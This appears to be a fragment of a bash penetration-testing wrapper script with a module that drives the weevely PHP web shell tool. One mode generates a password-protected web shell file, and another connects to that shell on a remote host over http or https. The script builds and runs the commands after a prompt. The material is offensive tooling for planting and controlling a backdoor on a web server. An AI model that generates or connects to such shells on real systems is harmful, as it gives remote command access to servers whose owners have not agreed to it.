## weevely [gen|help]^: weevely php shell
# weevely help
if [ "$1" == "weevely" ] && [ "$#" -ge 2 ] && [ "$2" == "help" ]; then
  echo "Available commands:"
  echo "  fxy weevely gen [file] [password]"
  echo "  fxy weevely [s|ssl|tls] [subdir] [file] [password]"
  exit
fi

# weevely generate
if [ "$1" == "weevely" ] && [ "$#" -ge 2 ] && [ "$2" == "gen" ]; then
  CMD="$1"; checkCmd
  FILE="fxy.php"
  getMachinePass
  # filename?
  if [ "$#" -eq 3 ]; then
    FILE="$3"
  fi
  # pasword?
  if [ "$#" -eq 4 ]; then
    PASSWD="$4"
  fi
  CMD="$CMD generate $PASSWD $FILE"
  echo "${bldwht}> $CMD${txtrst}"
  prompt
  bash -c "$CMD"
  exit
fi

# weevely connect mode
if [ "$1" == "weevely" ]; then
  CMD="$1"; checkCmd
  FILE="fxy.php"
  PROTO="http"
  SUBDIR="/"
  # more than 1 arg?
  if [ "$#" -ge 2 ]; then
    # https?
    if [ "$2" == "s" ] || [ "$2" == "ssl" ] || [ "$2" == "tls" ]; then
      PROTO="https"
    fi
    # subdir?
    if [ "$#" -eq 3 ] && [ "$PROTO" == "https" ]; then
      SUBDIR="$3"
    elif [ "$#" -eq 2 ] && [ "$PROTO" == "http" ]; then
      SUBDIR="$2"
    fi
    # filename?
    if [ "$#" -eq 4 ] && [ "$PROTO" == "https" ]; then
      FILE="$4"
    elif [ "$#" -eq 3 ] && [ "$PROTO" == "http" ]; then
      FILE="$3"
    fi
    # password?
    if [ "$#" -eq 5 ] && [ "$PROTO" == "https" ]; then
      PASSWD="$5"
    elif [ "$#" -eq 4 ] && [ "$PROTO" == "http" ]; then
      PASSWD="$4"
    fi
  fi
  getMachinePass
  CMD="$CMD $PROTO://${RHOST}${SUBDIR}${FILE} $PASSWD"
  echo "${bldwht}> $CMD${txtrst}"
  prompt
  bash -c "$CMD"
  exit
fi
